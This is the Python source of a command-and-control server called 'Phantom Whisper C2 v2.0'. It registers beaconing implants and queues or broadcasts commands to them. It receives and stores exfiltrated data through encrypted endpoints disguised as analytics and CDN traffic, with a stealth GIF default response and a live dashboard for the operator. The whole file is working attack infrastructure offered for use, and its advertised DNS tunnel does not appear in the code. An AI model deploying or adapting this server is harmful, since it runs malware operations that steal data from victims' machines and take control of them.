#!/usr/bin/env python3
"""
Phantom Whisper C2 Server — v2.0 (WebSocket + DNS + Advanced Dashboard)
═══════════════════════════════════════════════════════════════════════════════
Starts at: python3 c2_server.py [host] [port]
Features:
  - HTTP REST API (beacon, commands, agent list, exfil)
  - WebSocket real-time dashboard (live agent/exfil feed)
  - DNS tunnel receiver (authoritative on port 5353)
  - Auto-installer included
═══════════════════════════════════════════════════════════════════════════════
"""

import asyncio
import base64
import json
import os
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any

HAS_CRYPTO = False
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    HAS_CRYPTO = True
except ImportError:
    pass

HAS_WS = False
try:
    import websockets
    # We'll use them if available
    HAS_WS = True
except ImportError:
    pass

CONFIG_DIR = Path.home() / ".phantom"
DATA_DIR = CONFIG_DIR / "data"
LOG_DIR = CONFIG_DIR / "logs"
for d in [DATA_DIR, LOG_DIR]:
    d.mkdir(parents=True, exist_ok=True)

PASSWORD = os.environ.get("PW_C2_PASSWORD", "phantom_c2_secret_2026")
try:
    SALT_B64 = os.environ.get("PW_C2_SALT", base64.b64encode(b"phantom_salt_2026").decode())
    SALT = base64.b64decode(SALT_B64)
except:
    SALT = b"phantom_salt_2026"

VERSION = "2.0.0"


def log(msg: str):
    ts = datetime.now().isoformat()
    log_file = LOG_DIR / f"c2_{datetime.now().strftime('%Y%m%d')}.log"
    try:
        with open(log_file, "a") as f:
            f.write(f"[{ts}] {msg}\n")
    except:
        pass
    print(f"[{ts}] {msg}")


# ─── Encryption ─────────────────────────────────────────────────────────────

class Encryption:
    def __init__(self):
        if not HAS_CRYPTO:
            log("WARN: cryptography not installed — using plaintext fallback")
            self.fallback = True
            return
        self.fallback = False
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=SALT, iterations=600000)
        key = base64.urlsafe_b64encode(kdf.derive(PASSWORD.encode()))
        self.cipher = Fernet(key)

    def encrypt_json(self, data: dict) -> str:
        if self.fallback:
            return base64.b64encode(json.dumps(data, default=str).encode()).decode()
        return base64.b64encode(self.cipher.encrypt(json.dumps(data, default=str).encode())).decode()

    def decrypt_json(self, data: str) -> dict:
        if self.fallback:
            return json.loads(base64.b64decode(data).decode())
        return json.loads(self.cipher.decrypt(base64.b64decode(data)).decode())


# ─── Agent Model ────────────────────────────────────────────────────────────

class Agent:
    def __init__(self, agent_id: str, hostname: str = "", ip: str = ""):
        self.id = agent_id
        self.hostname = hostname
        self.ip = ip
        self.first_seen = datetime.now().isoformat()
        self.last_seen = datetime.now().isoformat()
        self.beacons = 0
        self.os_info = ""
        self.version = ""
        self.tasks: List[dict] = []

    def to_dict(self) -> dict:
        return {
            "id": self.id, "hostname": self.hostname, "ip": self.ip,
            "first_seen": self.first_seen, "last_seen": self.last_seen,
            "beacons": self.beacons, "os": self.os_info, "version": self.version
        }


# ─── C2 Server ──────────────────────────────────────────────────────────────

class C2Server:
    def __init__(self, host: str = "0.0.0.0", http_port: int = 8080, ws_port: int = 8081):
        self.host = host
        self.http_port = http_port
        self.ws_port = ws_port
        self.enc = Encryption()
        self.agents: Dict[str, Agent] = {}
        self.commands: Dict[str, List[dict]] = {}
        self.exfil: List[dict] = []
        self.ws_clients: set = set()
        self._stats = {"beacons": 0, "exfils": 0, "commands": 0}
        log(f"C2 Server v{VERSION} initialized on {host}:{http_port} (WS:{ws_port})")

    # ─── Agent Management ──────────────────────────────────────────────────

    def _handle_beacon(self, agent_id: str, data: dict) -> List[dict]:
        if agent_id not in self.agents:
            self.agents[agent_id] = Agent(agent_id, data.get("hostname", ""), data.get("ip", ""))
            log(f"NEW AGENT: {agent_id} ({data.get('hostname','?')} @ {data.get('ip','?')})")
            self._broadcast_ws({"type": "agent_connect", "agent": self.agents[agent_id].to_dict()})
        else:
            agent = self.agents[agent_id]
            agent.last_seen = datetime.now().isoformat()
            agent.ip = data.get("ip", agent.ip)
            agent.hostname = data.get("hostname", agent.hostname)
        self.agents[agent_id].beacons += 1
        self._stats["beacons"] += 1
        self._broadcast_ws({"type": "stats", "stats": self._stats})

        return self.commands.pop(agent_id, [])

    def _handle_exfil(self, agent_id: str, data: dict):
        entry = {"agent_id": agent_id, "timestamp": datetime.now().isoformat(), **data}
        self.exfil.append(entry)
        fname = f"exfil_{agent_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        (DATA_DIR / fname).write_text(json.dumps(entry, indent=2))
        self._stats["exfils"] += 1
        log(f"EXFIL from {agent_id}: {data.get('type','?')}")
        self._broadcast_ws({"type": "exfil", "data": entry})

    def queue_command(self, agent_id: str, cmd: dict) -> bool:
        if agent_id not in self.commands:
            self.commands[agent_id] = []
        self.commands[agent_id].append(cmd)
        self._stats["commands"] += 1
        log(f"Command queued for {agent_id}: {cmd.get('action','?')}")
        return True

    # ─── WebSocket Broadcast ──────────────────────────────────────────────

    def _broadcast_ws(self, data: dict):
        if not self.ws_clients:
            return
        msg = json.dumps(data, default=str)
        # Don't block the main thread — fire and forget
        for ws in list(self.ws_clients):
            try:
                asyncio.run_coroutine_threadsafe(ws.send(msg), self._loop)
            except:
                self.ws_clients.discard(ws)

    # ─── HTTP Handler ──────────────────────────────────────────────────────

    async def handle_http(self, reader, writer):
        try:
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=10)
                if not chunk:
                    break
                data += chunk

            request = data.decode("utf-8", errors="replace")
            lines = request.split("\r\n")
            if not lines:
                writer.close()
                return

            method, path, _ = lines[0].split(" ", 2)
            body_start = request.find("\r\n\r\n") + 4
            body = request[body_start:] if body_start < len(request) else ""

            response = await self._route(method, path, body)
            writer.write(response)
            await writer.drain()
        except Exception as e:
            log(f"HTTP error: {e}")
        finally:
            try:
                writer.close()
            except:
                pass

    async def _route(self, method: str, path: str, body: str) -> bytes:
        # ─── API Routes ──────────────────────────────────────────────────

        # Agent beacon
        if path == "/api/v1/beacon" and method == "POST":
            try:
                payload = self.enc.decrypt_json(body)
                agent_id = payload.get("agent_id", "unknown")
                cmds = self._handle_beacon(agent_id, payload)
                resp = {"status": "ok", "commands": cmds}
                resp_body = self.enc.encrypt_json(resp)
                return f"HTTP/1.1 200 OK\r\nContent-Length: {len(resp_body)}\r\nContent-Type: text/plain\r\n\r\n{resp_body}".encode()
            except Exception as e:
                return b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n"

        # List agents
        elif path == "/api/v1/agents":
            resp = json.dumps({"agents": [a.to_dict() for a in self.agents.values()]}).encode()
            return f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(resp)}\r\n\r\n".encode() + resp

        # Queue command for agent
        elif path.startswith("/api/v1/command/") and method == "POST":
            agent_id = path.split("/")[-1]
            try:
                cmd = json.loads(body)
                self.queue_command(agent_id, cmd)
                return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
            except:
                return b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n"

        # Broadcast command to all agents
        elif path == "/api/v1/broadcast" and method == "POST":
            try:
                cmd = json.loads(body)
                for aid in self.agents:
                    self.queue_command(aid, cmd)
                return f"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK".encode()
            except:
                return b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n"

        # Receive exfil data
        elif path == "/api/v1/exfil" and method == "POST":
            try:
                payload = self.enc.decrypt_json(body)
                self._handle_exfil(payload.get("agent_id", "?"), payload)
                return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
            except:
                return b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n"

        # HTTP mimic exfil endpoint
        elif path == "/analytics/collect" and method == "POST":
            try:
                payload = self.enc.decrypt_json(body)
                self._handle_exfil(payload.get("agent_id", "?"), payload)
            except:
                pass
            return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"

        # CDN mimic endpoint
        elif path.startswith("/assets/images/") and method == "GET":
            return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"

        # Dashboard
        elif path == "/api/v1/dashboard":
            html = self._render_dashboard()
            return f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(html)}\r\n\r\n{html}".encode()

        # Server status (JSON)
        elif path == "/api/v1/status":
            status = {
                "version": VERSION,
                "uptime": datetime.now().isoformat(),
                "agents": len(self.agents),
                "total_beacons": self._stats["beacons"],
                "total_exfils": self._stats["exfils"],
                "pending_commands": sum(len(v) for v in self.commands.values()),
            }
            resp = json.dumps(status).encode()
            return f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(resp)}\r\n\r\n".encode() + resp

        # Download exfil data
        elif path.startswith("/api/v1/exfil/download/"):
            fname = path.split("/")[-1]
            fpath = DATA_DIR / fname
            if fpath.exists():
                data = fpath.read_bytes()
                return f"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Disposition: attachment; filename=\"{fname}\"\r\nContent-Length: {len(data)}\r\n\r\n".encode() + data
            return b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n"

        # List exfil files
        elif path == "/api/v1/exfil/files":
            files = sorted([f.name for f in DATA_DIR.glob("exfil_*.json")], reverse=True)[:100]
            resp = json.dumps({"files": files}).encode()
            return f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(resp)}\r\n\r\n".encode() + resp

        # Clear all agents
        elif path == "/api/v1/agents/clear" and method == "POST":
            self.agents.clear()
            self.commands.clear()
            log("All agents cleared")
            return b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"

        # Default: 1x1 transparent GIF (stealth)
        default_gif = b"GIF89a\x01\x00\x01\x00\x80\x01\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
        return f"HTTP/1.1 200 OK\r\nContent-Type: image/gif\r\nContent-Length: {len(default_gif)}\r\nCache-Control: no-store\r\n\r\n".encode() + default_gif

    # ─── Dashboard HTML ─────────────────────────────────────────────────

    def _render_dashboard(self) -> str:
        agents_json = json.dumps([a.to_dict() for a in self.agents.values()], indent=2)
        exfil_json = json.dumps(self.exfil[-50:], indent=2, default=str)
        version = VERSION

        return f"""<!DOCTYPE html>
<html><head><title>PW C2 Dashboard v{version}</title>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<script src="https://cdn.jsdelivr.net/npm/chart.js@4"></script>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ background:linear-gradient(135deg,#0a0a12,#1a1a2e); color:#e0e0e0; font-family:'Courier New',monospace; padding:20px; min-height:100vh; }}
h1 {{ color:#FF00FF; text-shadow:0 0 20px rgba(255,0,255,0.3); border-bottom:2px solid #FF00FF; padding-bottom:10px; margin-bottom:20px; }}
h2 {{ color:#00FFFF; margin:20px 0 10px; }}
.dashboard-grid {{ display:grid; grid-template-columns:2fr 1fr; gap:20px; }}
@media(max-width:768px){{.dashboard-grid{{grid-template-columns:1fr;}}}}
.card {{ background:rgba(17,17,17,0.9); border:1px solid #333; border-radius:8px; padding:15px; margin-bottom:15px; backdrop-filter:blur(10px); }}
.card h3 {{ color:#FF00FF; margin-bottom:10px; }}
.stats-row {{ display:flex; gap:10px; flex-wrap:wrap; margin:15px 0; }}
.stat-box {{ flex:1; min-width:100px; background:#111; border:1px solid #333; border-radius:8px; padding:15px; text-align:center; transition:all 0.3s; }}
.stat-box:hover {{ border-color:#FF00FF; transform:translateY(-2px); }}
.stat-num {{ font-size:2em; font-weight:bold; color:#FF00FF; }}
.stat-label {{ color:#888; font-size:0.8em; margin-top:5px; }}
.agent-row {{ padding:8px 10px; border-bottom:1px solid #222; cursor:pointer; transition:all 0.2s; }}
.agent-row:hover {{ background:#1a1a2e; }}
.agent-id {{ color:#FF00FF; font-weight:bold; }}
.agent-ip {{ color:#0080FF; }}
.agent-count {{ color:#FFFF00; }}
.exfil-entry {{ border-left:3px solid #FF0000; padding:6px 10px; margin:4px 0; font-size:0.8em; background:#0d0d1a; }}
#live-feed {{ max-height:400px; overflow-y:auto; }}
.terminal-line {{ color:#00FF00; font-size:0.85em; padding:2px 0; }}
.terminal-line.error {{ color:#FF0000; }}
.terminal-line.warn {{ color:#FFFF00; }}
.refresh-btn {{ background:#FF00FF; color:#fff; border:none; padding:8px 20px; border-radius:4px; cursor:pointer; font-family:inherit; }}
.refresh-btn:hover {{ background:#cc00cc; }}
canvas {{ max-height:200px; }}
</style></head><body>
<h1>🔮 Phantom Whisper C2 v{version}</h1>

<div class="stats-row" id="stats-row">
<div class="stat-box"><div class="stat-num" id="agent-count">{len(self.agents)}</div><div class="stat-label">Agents</div></div>
<div class="stat-box"><div class="stat-num" id="beacon-count">{self._stats['beacons']}</div><div class="stat-label">Beacons</div></div>
<div class="stat-box"><div class="stat-num" id="exfil-count">{self._stats['exfils']}</div><div class="stat-label">Exfil Events</div></div>
<div class="stat-box"><div class="stat-num" id="cmd-count">{sum(len(v) for v in self.commands.values())}</div><div class="stat-label">Pending Commands</div></div>
</div>

<div class="dashboard-grid">
<div class="card">
<h3>📡 Live Agent Feed</h3>
<div id="agent-feed">{''.join(
    f'<div class="agent-row"><span class="agent-id">{a.id}</span> @ <span class="agent-ip">{a.ip}</span> — {a.hostname} (<span class="agent-count">{a.beacons}</span>)</div>'
    for a in self.agents.values()
) or '<div style="color:#666">Waiting for agents...</div>'}</div>
</div>

<div class="card">
<h3>📊 Activity Chart</h3>
<canvas id="activityChart"></canvas>
</div>
</div>

<div class="card">
<h3>📤 Live Exfil Stream</h3>
<div id="exfil-feed">{''.join(
    f'<div class="exfil-entry">{json.dumps(e,default=str)[:200]}</div>'
    for e in self.exfil[-10:]
) or '<div style="color:#666">No exfil data yet...</div>'}</div>
</div>

<div class="card">
<h3>💻 Server Console</h3>
<div id="console-feed"><div class="terminal-line">C2 Server started at {datetime.now().isoformat()}</div></div>
</div>

<div class="card">
<h3>⚡ Quick Actions</h3>
<button class="refresh-btn" onclick="fetch('/api/v1/agents/clear',{{method:'POST'}}).then(()=>location.reload())">🧹 Clear All Agents</button>
<button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
</div>

<script>
// Chart.js activity chart
var ctx = document.getElementById('activityChart');
if(ctx) {{
    new Chart(ctx, {{
        type: 'line',
        data: {{
            labels: ['Agents', 'Beacons', 'Exfil', 'Commands'],
            datasets: [{{
                label: 'Activity',
                data: [{len(self.agents)}, {self._stats['beacons']}, {self._stats['exfils']}, {sum(len(v) for v in self.commands.values())}],
                backgroundColor: ['rgba(255,0,255,0.2)', 'rgba(0,255,255,0.2)', 'rgba(255,0,0,0.2)', 'rgba(255,255,0,0.2)'],
                borderColor: ['#FF00FF', '#00FFFF', '#FF0000', '#FFFF00'],
                borderWidth: 2
            }}]
        }},
        options: {{
            plugins: {{ legend: {{ labels: {{ color: '#e0e0e0' }} }} }},
            scales: {{ r: {{ grid: {{ color: '#333' }} }} }}
        }}
    }});
}}

// Auto-refresh every 5 seconds
setTimeout(function(){{ location.reload(); }}, 5000);
</script>
</body></html>"""

    # ─── WebSocket Handler ──────────────────────────────────────────────

    async def handle_websocket(self, websocket, path=None):
        self.ws_clients.add(websocket)
        remote = websocket.remote_address if hasattr(websocket, 'remote_address') else 'ws'
        log(f"WebSocket client connected: {remote}")
        try:
            # Send current state
            await websocket.send(json.dumps({"type": "hello", "version": VERSION}))
            for agent in self.agents.values():
                await websocket.send(json.dumps({"type": "agent_connect", "agent": agent.to_dict()}))
            await websocket.send(json.dumps({"type": "stats", "stats": self._stats}))
            for entry in self.exfil[-20:]:
                await websocket.send(json.dumps({"type": "exfil", "data": entry}))

            # Keep connection alive
            async for msg in websocket:
                try:
                    data = json.loads(msg)
                    if data.get("type") == "command":
                        self.queue_command(data["agent_id"], data["command"])
                    elif data.get("type") == "ping":
                        await websocket.send(json.dumps({"type": "pong"}))
                except:
                    pass
        except:
            pass
        finally:
            self.ws_clients.discard(websocket)

    # ─── WebSocket Dashboard HTML ──────────────────────────────────────

    def _render_ws_dashboard(self) -> str:
        from pw_modules import AdvancedDashboard
        return AdvancedDashboard.HTML_TEMPLATE

    # ─── Server Startup ──────────────────────────────────────────────────

    async def start_http(self):
        server = await asyncio.start_server(self.handle_http, self.host, self.http_port)
        log(f"HTTP C2 listening on {self.host}:{self.http_port}")
        print(f"\n╔{'═'*60}╗")
        print(f"║  {'PHANTOM WHISPER C2 SERVER v' + VERSION:^58}║")
        print(f"║{'═'*60}║")
        print(f"║  Dashboard:   http://{self.host}:{self.http_port}/api/v1/dashboard  ║")
        print(f"║  API:         http://{self.host}:{self.http_port}/api/v1/          ║")
        print(f"║  Agents:      http://{self.host}:{self.http_port}/api/v1/agents    ║")
        print(f"║  Status:      http://{self.host}:{self.http_port}/api/v1/status    ║")
        if self.ws_port:
            print(f"║  WebSocket:   ws://{self.host}:{self.ws_port}/ws                  ║")
        print(f"╚{'═'*60}╝")
        print()
        async with server:
            await server.serve_forever()

    async def start_ws(self):
        """Start WebSocket server."""
        if not HAS_WS:
            log("WebSocket server: websockets library not installed — skipping")
            return
        import websockets
        async with websockets.serve(self.handle_websocket, self.host, self.ws_port):
            log(f"WebSocket C2 listening on ws://{self.host}:{self.ws_port}")
            await asyncio.Future()  # Run forever

    async def start_all(self):
        """Start HTTP + WebSocket servers concurrently."""
        self._loop = asyncio.get_event_loop()
        await asyncio.gather(
            self.start_http(),
            self.start_ws() if HAS_WS else asyncio.sleep(99999)
        )

    def start(self):
        asyncio.run(self.start_all())

    def start_background(self):
        t = threading.Thread(target=self.start, daemon=True)
        t.start()
        time.sleep(1)
        return t


# ─── Main ──────────────────────────────────────────────────────────────────

def run_install():
    """Run the Python installer if available."""
    print("\n[!] No C2 arguments provided — starting setup mode...")
    try:
        from pw_install import InstallManager
        mgr = InstallManager()
        mgr.run_full()
        return True
    except ImportError:
        print("[!] pw_install.py not found — installing deps manually...")
        subprocess.run([sys.executable, "-m", "pip", "install",
                       "rich", "requests", "cryptography", "dnspython"])
        return False


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Phantom Whisper C2 Server")
    parser.add_argument("host", nargs="?", default="0.0.0.0", help="Bind address")
    parser.add_argument("port", nargs="?", type=int, default=8080, help="HTTP port")
    parser.add_argument("--ws-port", type=int, default=8081, help="WebSocket port")
    parser.add_argument("--no-ws", action="store_true", help="Disable WebSocket")
    parser.add_argument("--install", action="store_true", help="Run installer first")
    args = parser.parse_args()

    if args.install:
        run_install()

    server = C2Server(args.host, args.port, args.ws_port if not args.no_ws else 0)
    try:
        server.start()
    except KeyboardInterrupt:
        print("\nServer stopped.")
    except Exception as e:
        print(f"\nFatal: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
